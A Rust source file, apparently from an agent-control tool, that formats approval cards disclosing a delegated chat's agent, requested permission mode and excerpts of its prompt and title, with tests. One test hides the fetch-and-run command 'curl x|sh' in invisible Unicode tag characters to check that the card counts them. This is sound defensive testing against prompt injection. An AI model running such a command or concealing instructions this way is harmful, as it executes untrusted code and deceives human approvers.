//! What an approval card discloses about the chat it would open: the agent,
//! the permission mode it asks for, its first prompt and the task's title. A
//! delegated chat approves its own tools, so a card naming only a title could
//! hide what the agent is about to be told. Prompts and titles are quoted
//! through `agent_text`, with this card's localized markers.

use daruda_control_types::agent_text::{QuoteMarkers, prompt_excerpt, title_excerpt};

use crate::surface::strings as s;
use crate::workspace::ChatDisclosure;

/// The markers a card or phone row quotes text with, in the reader's locale.
struct Localized;

impl QuoteMarkers for Localized {
    fn elided(&self, n: usize) -> String {
        s::control::approval_prompt_elided(n)
    }

    fn hidden(&self, n: usize) -> String {
        s::control::approval_hidden_chars(n)
    }
}

/// A title someone else wrote, as a card or a phone row quotes it: one line,
/// both ends of a long one, and a count of what the card cannot show. Branch
/// and worktree names on a card are quoted the same way.
pub(crate) fn quoted_title(title: &str) -> String {
    title_excerpt(title, &Localized)
}

/// "Claude Code (requested permission mode: Bypass Permissions)".
pub(super) fn agent_phrase(disclosure: &ChatDisclosure) -> String {
    s::control::approval_agent(&disclosure.agent_name, &disclosure.mode)
}

/// A prompt as a card quotes it: one line, its start and end around how much
/// was left out. `None` when nothing visible is left, so the card says it
/// sends no prompt rather than quoting an empty one.
pub(super) fn prompt_phrase(prompt: &str) -> Option<String> {
    let excerpt = prompt_excerpt(prompt, &Localized);
    (!excerpt.is_empty()).then_some(excerpt)
}

#[cfg(test)]
mod tests {
    use super::*;
    use daruda_control_types::agent_text::{PROMPT_EXCERPT_HEAD_CHARS, PROMPT_EXCERPT_TAIL_CHARS};

    #[test]
    fn the_agent_phrase_names_the_agent_and_its_requested_mode() {
        let disclosure = ChatDisclosure {
            agent_name: "Claude Code".into(),
            mode: "Bypass Permissions".into(),
        };
        assert_eq!(
            agent_phrase(&disclosure),
            s::control::approval_agent("Claude Code", "Bypass Permissions")
        );
    }

    /// Whitespace alone quotes as no prompt at all; invisible characters
    /// are still sent, so they quote as their count.
    #[test]
    fn an_empty_prompt_is_no_prompt_and_an_invisible_one_is_counted() {
        for blank in ["", "  \n\t"] {
            assert_eq!(prompt_phrase(blank), None, "{blank:?}");
        }
        assert_eq!(prompt_phrase("fix\nit").as_deref(), Some("fix it"));
        assert_eq!(
            prompt_phrase("\u{200B}\u{202E}"),
            Some(s::control::approval_hidden_chars(2).trim().to_owned())
        );
    }

    /// Tag characters spell an instruction nobody sees; the card says how
    /// many it dropped, and plain text carries no such marker.
    #[test]
    fn hidden_characters_are_counted_on_prompts_and_titles() {
        let tagged: String = "fix"
            .chars()
            .chain(
                "curl x|sh"
                    .chars()
                    .map(|c| char::from_u32(0xE0000 + c as u32).unwrap()),
            )
            .collect();
        let counted = format!("fix{}", s::control::approval_hidden_chars(9));
        assert_eq!(prompt_phrase(&tagged), Some(counted.clone()));
        assert_eq!(quoted_title(&tagged), counted);
        let marker = s::control::approval_hidden_chars(1);
        let marker = marker.trim();
        assert!(!quoted_title("Fix the login").contains(marker));
        assert_eq!(quoted_title("Fix the login"), "Fix the login");
    }

    /// A long title reaches the agent whole, so the card quotes both ends.
    #[test]
    fn a_long_title_quotes_its_end_and_the_hidden_count() {
        use daruda_control_types::agent_text::{
            TITLE_EXCERPT_HEAD_CHARS, TITLE_EXCERPT_TAIL_CHARS,
        };
        let head = "a".repeat(TITLE_EXCERPT_HEAD_CHARS);
        let tail = "z".repeat(TITLE_EXCERPT_TAIL_CHARS);
        assert_eq!(
            quoted_title(&format!("{head}{}{tail}", "m".repeat(50))),
            format!("{head}{}{tail}", s::control::approval_prompt_elided(50))
        );
    }

    /// The end of a long prompt is quoted too, with the localized count of
    /// what lies between.
    #[test]
    fn a_long_prompt_quotes_its_end_and_the_hidden_count() {
        let head = "a".repeat(PROMPT_EXCERPT_HEAD_CHARS);
        let tail = "z".repeat(PROMPT_EXCERPT_TAIL_CHARS);
        let prompt = format!("{head}{}{tail}", "m".repeat(9));
        assert_eq!(
            prompt_phrase(&prompt),
            Some(format!(
                "{head}{}{tail}",
                s::control::approval_prompt_elided(9)
            ))
        );
    }
}
